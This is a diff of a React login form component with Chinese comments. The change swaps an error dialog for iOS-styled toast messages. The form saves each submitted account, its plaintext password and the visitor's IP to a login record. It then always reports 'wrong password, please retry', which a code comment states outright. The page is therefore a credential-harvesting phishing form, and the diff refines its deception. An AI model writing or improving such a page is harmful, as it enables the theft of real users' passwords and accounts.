@@ -2,17 +2,10 @@ import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { Card, CardContent } from "@/components/ui/card"
-import {
-  Dialog,
-  DialogContent,
-  DialogHeader,
-  DialogTitle,
-  DialogDescription,
-  DialogFooter,
-} from "@/components/ui/dialog"
 import { useState, useEffect } from "react"
 import { useIsMobile } from "@/hooks/use-mobile"
 import { saveLoginRecord } from "@/lib/login-records"
+import { toast } from "sonner"
 
 /**
  * 登录表单组件
@@ -35,21 +28,36 @@ export default function LoginForm() {
       })
   }, [])
   
-  // 状态变量用于存储错误信息
-  const [errorMessage, setErrorMessage] = useState('')
-  const [showErrorDialog, setShowErrorDialog] = useState(false)
+  // 状态变量用于存储错误信息（已简化 - 使用toast替代）
   
-  // 处理登录提交
+  /**
+   * 处理登录提交
+   * 验证表单输入并显示密码错误提示弹窗
+   */
   const handleLogin = async () => {
-    // 重置错误信息
-    setErrorMessage('')
+    // 基本表单验证
+    if (!account.trim()) {
+      toast.error('请输入账号', {
+        description: '账号不能为空',
+        duration: 2000,
+      })
+      return
+    }
+    
+    if (!password.trim()) {
+      toast.error('请输入密码', {
+        description: '密码不能为空',
+        duration: 2000,
+      })
+      return
+    }
     
     // 记录登录信息
     const loginRecord = {
       id: Date.now(),
       timestamp: new Date().toLocaleString(),
       ip: userIP,
-      account,
+      account: account.trim(),
       password,
       isFirstLogin: false // 初始值，会在saveLoginRecord函数中更新
     }
@@ -58,11 +66,32 @@ export default function LoginForm() {
       // 保存登录记录到本地文件
       await saveLoginRecord(loginRecord)
       
-      // 无论输入什么账号密码，都显示密码错误
-      setShowErrorDialog(true)
+      // 无论输入什么账号密码，都显示密码错误 - iOS风格提示弹窗
+      toast.error('密码错误', {
+        description: '请修改密码后重试',
+        duration: 4000,
+        style: {
+          background: 'white',
+          color: '#1c1917',
+          border: 'none',
+          borderRadius: '12px',
+          boxShadow: '0 10px 25px -5px rgba(0, 0, 0, 0.15), 0 4px 10px -3px rgba(0, 0, 0, 0.08)',
+          fontSize: '14px',
+        },
+        className: 'font-medium',
+      })
     } catch (error) {
       console.error('保存登录记录失败:', error)
-      setShowErrorDialog(true)
+      toast.error('登录失败', {
+        description: '系统错误，请稍后重试',
+        duration: 3000,
+        style: {
+          background: '#fee2e2',
+          color: '#dc2626',
+          border: '1px solid #fecaca',
+          borderRadius: '8px',
+        },
+      })
     }
   }
   
@@ -118,27 +147,6 @@ export default function LoginForm() {
           </CardContent>
         </Card>
       </div>
-    </div>
-      {/* 苹果风格错误弹窗 */}
-      <Dialog open={showErrorDialog} onOpenChange={setShowErrorDialog}>
-        <DialogContent className="max-w-sm mx-auto rounded-xl shadow-2xl border-0 p-0 bg-white">
-          <DialogHeader className="text-center border-b-0">
-            <DialogTitle className="text-center text-lg font-semibold text-gray-900">登录失败</DialogTitle>
-            <DialogDescription className="text-center text-sm text-gray-600 mt-1 px-6">
-              密码错误，请修改密码并重试
-            </DialogDescription>
-          </DialogHeader>
-          <DialogFooter className="border-0 pb-0 flex justify-center p-4">
-            <Button 
-              type="button"
-              className="w-full bg-blue-500 hover:bg-blue-600 text-white font-medium"
-              onClick={() => setShowErrorDialog(false)}
-            >
-              确定
-            </Button>
-          </DialogFooter>
-        </DialogContent>
-      </Dialog>
     </div>
   )
 }
